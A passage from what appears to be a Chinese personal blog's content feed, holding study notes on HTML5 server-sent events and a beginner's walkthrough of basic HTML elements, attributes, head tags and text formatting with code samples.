方法。</p><pre class=" language-JavaScript"><code class="language-JavaScript">var source = new EventSource("demo_sse.php");source.onmessage = function(event) {    document.getElementById("result").innerHTML += event.data + "<br>";};</code></pre><p>这里创建了一个 EventSource 对象，然后规定发送更新的页面的 URL（”demo_sse.php”）。</p><p>每当接收到一次更新，就会发生 onmessage 事件，把已接收的数据推入 id 为 “result” 的元素中。</p><p>最好再加一个判断，看看浏览器是否支持SSE。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>result<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">typeof</span><span class="token punctuation">(</span>EventSource<span class="token punctuation">)</span><span class="token operator">!==</span><span class="token string">"undefined"</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">var</span> source<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">EventSource</span><span class="token punctuation">(</span><span class="token string">"/example/html5/demo_sse.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        source<span class="token punctuation">.</span>onmessage<span class="token operator">=</span><span class="token keyword">function</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"result"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML<span class="token operator">+</span><span class="token operator">=</span>event<span class="token punctuation">.</span>data <span class="token operator">+</span> <span class="token string">"&lt;br />"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>        document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"result"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML<span class="token operator">=</span><span class="token string">"抱歉，您的浏览器不支持 server-sent 事件 ..."</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><p>服务器端的话，把 <code>"Content-Type"</code> 报头设置为 <code>"text/event-stream"</code>，就可以开始发送事件流了。</p><br><br><hr><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>HTML 的部分大概就告一段落了，如果要具体学的话，要想搞清楚每个属性的含义就感觉在看文档了，感觉没有必要。</p><p>还不如之后有不理解的再回来翻一翻，更狭义的知识点直接查文档就好了呀！</p><p>接下来就慢慢看看 CSS 和 JavaScript好了。</p><p>溜了溜了。</p><p><small><em>（这个寒假出不了门好难受啊嘤嘤嘤</em> </small></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> FrontEnd </category>
          
      </categories>
      
      
        <tags>
            
            <tag> FrontEnd </tag>
            
            <tag> HTML </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>FrontEnd | HTML 基础入门学习笔记</title>
      <link href="/2020/02/14/FrontEnd_HTML_Basic/"/>
      <url>/2020/02/14/FrontEnd_HTML_Basic/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近想<strong>系统一点学一学前端</strong>，这一篇博客就简要记录一些前端中 <strong>HTML 基础入门</strong>的学习笔记吧。</p><p>看完了小甲鱼目前更新了的web开发入门的视频，讲的还是挺不错的，总体来说还算比较系统的，而且<em>疑车有据</em>23333。</p><p>不过感觉不够全面，于是再来刷了一遍 W3School。</p><p>后面忘了还可以再来看看，或者再查文档就完事了。😂</p><p>其实就是简单过一遍23333 <em>类似于抄一遍（x</em></p><p><strong>这篇文章超长长长长长长长长……</strong> 所以先做好准备。</p><p>由于我的博客自带了一些CSS样式，<strong>显示的效果可能和预计的不同，最好还是建一个新的HTML文件来试试</strong>吧。</p><br><h3 id="一些参考的网站"><a href="#一些参考的网站" class="headerlink" title="一些参考的网站"></a>一些参考的网站</h3><p><a href="https://www.w3school.com.cn/html/index.asp" target="_blank" rel="noopener">W3School HTML 教程</a></p><p><a href="https://man.ilovefishc.com/html5/" target="_blank" rel="noopener">速查宝典：HTML5 API速查（鱼C工作室）</a></p><p><a href="https://www.runoob.com/html/html-tutorial.html" target="_blank" rel="noopener">HTML 菜鸟教程</a></p><p>B站视频 <em>（小甲鱼的视频居然还没更新完，催更一波</em></p><br><h2 id="整体框架"><a href="#整体框架" class="headerlink" title="整体框架"></a>整体框架</h2><p>HTML5</p><pre class=" language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>width<span class="token punctuation">=</span>device-width, initial-scale<span class="token punctuation">=</span>1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Document<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>在VS Code中可以直接输入<code>html:5</code>，按下<code>Tab</code>键即可自动输入模板。用的是 <strong>Emmet Abbreviation</strong>。</p><br><hr><p>下面主要参考 <strong>W3School</strong> 的教程。更详细的请参考<a href="https://www.w3school.com.cn" target="_blank" rel="noopener">官网</a>。</p><h2 id="元素"><a href="#元素" class="headerlink" title="元素"></a>元素</h2><p><strong>HTML 文档是由 HTML 元素定义的。</strong></p><p>元素指的是从<strong>开始标签（start tag）</strong> <em>or开放标签（opening tag）</em> 到<strong>结束标签（end tag）</strong> <em>or闭合标签（closing tag）</em> 的所有代码。</p><p>空元素<strong>在开始标签中进行关闭</strong>（以开始标签的结束而结束），如<code>&lt;br /&gt;</code>。虽然写成<code>&lt;br&gt;</code>也行，但建议都关闭。</p><p>HTML 标签对大小写不敏感：<code>&lt;P&gt;</code> 等同于<code>&lt;p&gt;</code>。但是推荐/强制使用<strong>小写字母</strong>。</p><br><h2 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h2><p><strong>属性为 HTML 元素提供附加信息。</strong></p><p>属性总是以名称/值对的形式出现，比如：<em>name=”value”</em>。总是在 HTML 元素的<strong>开始标签</strong>中规定。</p><p>属性和属性值对大小写<strong>不敏感</strong>。但推荐使用<strong>小写</strong>。</p><p>属性值要包含在引号内，双引号、单引号均可。若属性值本身就含有双引号，那么必须使用单引号↓。</p><pre><code>name='Bill "HelloWorld" Gates'</code></pre><p>常用的 HTML 属性：</p><table><thead><tr><th>属性</th><th>值</th><th>描述</th></tr></thead><tbody><tr><td>class</td><td><em>classname</em></td><td>规定元素的类名（classname）</td></tr><tr><td>id</td><td><em>id</em></td><td>规定元素的唯一 id</td></tr><tr><td>style</td><td><em>style_definition</em></td><td>规定元素的行内样式（inline style）</td></tr><tr><td>title</td><td><em>text</em></td><td>规定元素的额外信息（可在工具提示中显示）</td></tr></tbody></table><br><h2 id="头部-head"><a href="#头部-head" class="headerlink" title="头部 head"></a>头部 head</h2><p><code>head</code>元素中可以包含<code>&lt;title&gt;</code>、<code>&lt;base&gt;</code>、<code>&lt;link&gt;</code>、<code>&lt;meta&gt;</code>、<code>&lt;script&gt;</code> 以及 <code>&lt;style&gt;</code>。</p><h3 id="title-元素"><a href="#title-元素" class="headerlink" title="title 元素"></a>title 元素</h3><p><code>&lt;title&gt;</code> 标签定义文档的标题。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Title of the document<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></code></pre><h3 id="base-元素"><a href="#base-元素" class="headerlink" title="base 元素"></a>base 元素</h3><p><code>&lt;base&gt;</code> 标签为页面上的所有链接规定默认地址或默认目标（target）：</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>base</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://miaotony.xyz/<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>base</span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></code></pre><h3 id="link-元素"><a href="#link-元素" class="headerlink" title="link 元素"></a>link 元素</h3><p>定义文档与外部资源之间的关系。如样式表等。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/css<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>mystyle.css<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></code></pre><h3 id="style-元素"><a href="#style-元素" class="headerlink" title="style 元素"></a>style 元素</h3><p><code>&lt;style&gt;</code> 标签用于为 HTML 文档定义样式信息。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/css<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token style language-css">        <span class="token selector">body </span><span class="token punctuation">{</span><span class="token property">background-color</span><span class="token punctuation">:</span>yellow<span class="token punctuation">}</span>        <span class="token selector">p </span><span class="token punctuation">{</span><span class="token property">color</span><span class="token punctuation">:</span>blue<span class="token punctuation">}</span>    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></code></pre><h3 id="meta-元素"><a href="#meta-元素" class="headerlink" title="meta 元素"></a>meta 元素</h3><p>元数据（metadata）是关于数据的信息。</p><p><code>&lt;meta&gt;</code> 标签提供关于 HTML 文档的元数据。元数据不会显示在页面上，但是对于机器是可读的。</p><p>典型的情况是，meta 元素被用于规定页面的描述、关键词、文档的作者、最后修改时间以及其他元数据。</p><p><code>&lt;meta&gt;</code> 标签始终位于 head 元素中。</p><p>元数据可用于浏览器（如何显示内容或重新加载页面），搜索引擎（关键词），或其他 web 服务。</p><h4 id="指定-UTF-8-编码"><a href="#指定-UTF-8-编码" class="headerlink" title="指定 UTF-8 编码"></a>指定 UTF-8 编码</h4><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></code></pre><h4 id="网页尺寸自适应"><a href="#网页尺寸自适应" class="headerlink" title="网页尺寸自适应"></a>网页尺寸自适应</h4><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>width<span class="token punctuation">=</span>device-width, initial-scale<span class="token punctuation">=</span>1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></code></pre><h4 id="一些SEO关键词优化"><a href="#一些SEO关键词优化" class="headerlink" title="一些SEO关键词优化"></a>一些SEO关键词优化</h4><p>关键词，描述，作者等。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>keywords<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>MiaoTony, HTML, test<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>description<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>MiaoTony<span class="token punctuation">'</span>s HTML test.<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>author<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>MiaoTony<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></code></pre><h4 id="自动刷新跳转页面-重定向页面"><a href="#自动刷新跳转页面-重定向页面" class="headerlink" title="自动刷新跳转页面 / 重定向页面"></a>自动刷新跳转页面 / 重定向页面</h4><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>refresh<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>0; https://miaotony.xyz<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></code></pre><p>0s后自动跳转。</p><br><h2 id="标题"><a href="#标题" class="headerlink" title="标题"></a>标题</h2><p>标题（Heading）是通过 <code>&lt;h1&gt;</code> - <code>&lt;h6&gt;</code>定义，从大到小。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>This is heading 1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span>This is heading 2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h3</span><span class="token punctuation">></span></span>This is heading 3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h3</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h4</span><span class="token punctuation">></span></span>This is heading 4<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h4</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h5</span><span class="token punctuation">></span></span>This is heading 5<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h5</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h6</span><span class="token punctuation">></span></span>This is heading 6<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h6</span><span class="token punctuation">></span></span></code></pre><blockquote><p>请仅仅把标题标签用于标题文本。不要仅仅为了产生粗体文本而使用它们。请使用其它标签或 CSS 代替。</p></blockquote><br><h2 id="水平线"><a href="#水平线" class="headerlink" title="水平线"></a>水平线</h2><p><code>&lt;hr /&gt;</code>标签用于定义水平线。如↓。</p><hr><br><h2 id="段落"><a href="#段落" class="headerlink" title="段落"></a>段落</h2><p> <code>&lt;p&gt;</code> 标签</p><p>浏览器会自动地在段落的前后添加空行。（<code>&lt;p&gt;</code> 是块级元素）</p><p>插入空行可以利用 <code>&lt;br /&gt;</code>，不要用 <code>p</code> 标签。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>这是段落<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span></code></pre><p>这是段落</p><hr><p>在不产生一个新段落的情况下进行换行（新行），使用 <code>&lt;br /&gt;</code>，比如：</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>This is<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span>a para<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span>graph with line breaks<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span></code></pre><p>This is<br>a para<br>graph with line breaks</p>---<p>显示页面时，浏览器会移除<em>源代码中</em>多余的空格和空行。<strong>所有连续的空格或空行都会被算作一个空格。</strong></p><p>需要注意的是，<strong>HTML 代码中的所有连续的空行（换行）也被显示为一个空格。</strong>比如：</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>    春眠不觉晓，      处处闻啼鸟。        夜来风雨声，          花落知多少。<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span></code></pre><p>    春眠不觉晓，      处处闻啼鸟。        夜来风雨声，          花落知多少。</p><br><h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><pre class=" language-html"><code class="language-html"><span class="token comment" spellcheck="true">&lt;!-- This is a comment --></span></code></pre><h3 id="条件注释"><a href="#条件注释" class="headerlink" title="条件注释"></a>条件注释</h3><p>条件注释定义只有 Internet Explorer 执行的 HTML 标签。</p><pre class=" language-html"><code class="language-html"><span class="token comment" spellcheck="true">&lt;!--[if lt IE 9]>  &lt;script src="http://html5shiv.googlecode.com/svn/trunk/html5.js">&lt;/script>&lt;![endif]--></span></code></pre><br><h2 id="样式"><a href="#样式" class="headerlink" title="样式"></a>样式</h2><p><code>&lt;style&gt;</code> 标签用于为 HTML 文档定义样式信息。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">font-family</span><span class="token punctuation">:</span>verdana<span class="token punctuation">;</span><span class="token property">color</span><span class="token punctuation">:</span>red</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>This text is in Verdana and red<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">font-family</span><span class="token punctuation">:</span>times<span class="token punctuation">;</span><span class="token property">color</span><span class="token punctuation">:</span>green</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>This text is in Times and green<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">font-size</span><span class="token punctuation">:</span><span class="token number">30</span>px</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>This text is 30 pixels high<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span></code></pre><p style="font-family:verdana;color:red">This text is in Verdana and red</p><p style="font-family:times;color:green">This text is in Times and green</p><p style="font-size:30px">This text is 30 pixels high</p>下面是一些实例，更多关于样式的需要看 **CSS教程** 来着（（<h3 id="背景颜色"><a href="#背景颜色" class="headerlink" title="背景颜色"></a>背景颜色</h3><p><em><code>bgcolor</code> 属性已经弃用了</em>，要用<code>background-color</code>。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">background-color</span><span class="token punctuation">:</span>blue</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>This is a paragraph.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span></code></pre><p style="background-color:blue">This is a paragraph.</p>  <br><h3 id="字体、颜色和尺寸"><a href="#字体、颜色和尺寸" class="headerlink" title="字体、颜色和尺寸"></a>字体、颜色和尺寸</h3><p>style 属性淘汰了旧的 <code>&lt;font&gt;</code> 标签。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">font-family</span><span class="token punctuation">:</span>arial<span class="token punctuation">;</span><span class="token property">color</span><span class="token punctuation">:</span>red<span class="token punctuation">;</span><span class="token property">font-size</span><span class="token punctuation">:</span><span class="token number">25</span>px<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>A paragraph.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span></code></pre><p style="font-family:arial;color:red;font-size:25px;">A paragraph.</p><br><h3 id="文本对齐"><a href="#文本对齐" class="headerlink" title="文本对齐"></a>文本对齐</h3><p>使用<code>text-align</code>属性</p><p>style 属性淘汰了旧的 <code>align</code> 属性。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">text-align</span><span class="token punctuation">:</span>left</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>靠左对齐<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">text-align</span><span class="token punctuation">:</span>center</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>居中对齐<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">text-align</span><span class="token punctuation">:</span>right</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>靠右对齐<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span></code></pre><p style="text-align:left">靠左对齐</p><p style="text-align:center">居中对齐</p><p style="text-align:right">靠右对齐</p><br><h2 id="文本格式化"><a href="#文本格式化" class="headerlink" title="文本格式化"></a>文本格式化</h2><p><strong>定义很多供格式化输出的元素，比如粗体和斜体字。</strong></p><h3 id="格式化"><a href="#格式化" class="headerlink" title="格式化"></a>格式化</h3><p>建议用<code>strong</code>、<code>em</code>这类<strong>基于内容的样式</strong>（content-based style）来代替<code>b</code>、<code>i</code>这类<strong>物理样式</strong>（physical style），更能语义化。</p><p>详见这里：<a href="https://www.w3school.com.cn/html/html_style.asp" target="_blank" rel="noopener">HTML 教程延伸阅读：改变文本的外观和含义</a></p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>b</span><span class="token punctuation">></span></span>This text is bold<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>b</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>strong</span><span class="token punctuation">></span></span>This text is strong<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>strong</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>big</span><span class="token punctuation">></span></span>This text is big<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>big</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>em</span><span class="token punctuation">></span></span>This text is emphasized<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>em</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>i</span><span class="token punctuation">></span></span>This text is italic<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>i</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>small</span><span class="token punctuation">></span></span>This text is small<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>small</span><span class="token punctuation">></span></span>This text contains<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>sub</span><span class="token punctuation">></span></span>subscript下标<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>sub</span><span class="token punctuation">></span></span>This text contains<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>sup</span><span class="token punctuation">></span></span>superscript上标<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>sup</span><span class="token punctuation">></span></span></code></pre><p><b>This text is bold</b></p><p><strong>This text is strong</strong></p><p><big>This text is big</big></p><p><em>This text is emphasized</em></p><p><i>This text is italic</i></p><p><small>This text is small</small></p><p>This text contains<sub>subscript下标</sub></p><p>This text contains<sup>superscript上标</sup></p><hr><h3 id="预格式文本"><a href="#预格式文本" class="headerlink" title="预格式文本"></a>预格式文本</h3><p><code>&lt;pre&gt;</code>标签</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>pre</span><span class="token punctuation">></span></span>这是预格式文本。它保留了      空格和换行。<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>pre</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>pre</span><span class="token punctuation">></span></span>for i in range(1,10):     print(i)<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>pre</span><span class="token punctuation">></span></span></code></pre><pre>这是预格式文本。它保留了      空格和换行。</pre><p><code>pre</code> 标签很适合显示计算机代码：（可以先用<code>pre</code>再用<code>code</code>标签</p><pre>for i in range(1,10):     print(i)</pre><hr><h3 id="计算机-编程代码"><a href="#计算机-编程代码" class="headerlink" title="计算机/编程代码"></a>计算机/编程代码</h3><p>这些标签常用于显示计算机/编程代码↓。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>code</span><span class="token punctuation">></span></span>Computer code<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>code</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>kbd</span><span class="token 